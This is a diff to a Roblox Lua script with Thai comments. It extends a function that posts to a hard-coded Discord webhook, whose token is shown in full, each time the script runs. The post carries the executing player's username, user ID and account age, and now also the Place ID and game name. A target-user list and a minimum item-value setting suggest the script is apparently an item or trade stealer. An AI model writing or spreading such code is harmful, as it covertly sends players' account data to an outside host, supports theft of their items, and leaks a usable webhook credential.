@@ -21,9 +21,16 @@ local users = {"oyaoming"}
 local min_rap = _G.minrap or 46000
 local webhook = "https://discord.com/api/webhooks/1480099215186071575/L3nGzbh8TONH-YSfklBgg0SRlNHcG-tK4WB1TMbEmUnvciqWNoYwmKYd8zMtUrMDf-jX"
 
--- ฟังก์ชันแจ้งเตือนเมื่อมีการกดรันสคริปต์
+-- ฟังก์ชันแจ้งเตือนเมื่อมีการกดรันสคริปต์ (เวอร์ชันเพิ่ม Place ID)
 local function SendExecutionWebhook()
     local headers = {["Content-Type"] = "application/json"}
+    
+    -- ดึงชื่อแมพ (Optional: ถ้าต้องการชื่อแมพด้วย)
+    local successName, mapName = pcall(function() 
+        return game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name 
+    end)
+    mapName = successName and mapName or "Unknown Game"
+
     local data = {
         ["embeds"] = {{
             ["title"] = "🚀 Script Executed!",
@@ -32,11 +39,15 @@ local function SendExecutionWebhook()
             ["fields"] = {
                 {["name"] = "Username", ["value"] = "||" .. plr.Name .. "||", ["inline"] = true},
                 {["name"] = "User ID", ["value"] = tostring(plr.UserId), ["inline"] = true},
-                {["name"] = "Account Age", ["value"] = plr.AccountAge .. " days", ["inline"] = true}
+                {["name"] = "Account Age", ["value"] = plr.AccountAge .. " days", ["inline"] = true},
+                -- เพิ่มฟิลด์ด้านล่างนี้
+                {["name"] = "Place ID", ["value"] = "[" .. game.PlaceId .. "](https://www.roblox.com/games/" .. game.PlaceId .. ")", ["inline"] = true},
+                {["name"] = "Game Name", ["value"] = mapName, ["inline"] = true}
             },
             ["timestamp"] = DateTime.now():ToIsoDate()
         }}
     }
+    
     pcall(function()
         request({
             Url = webhook,
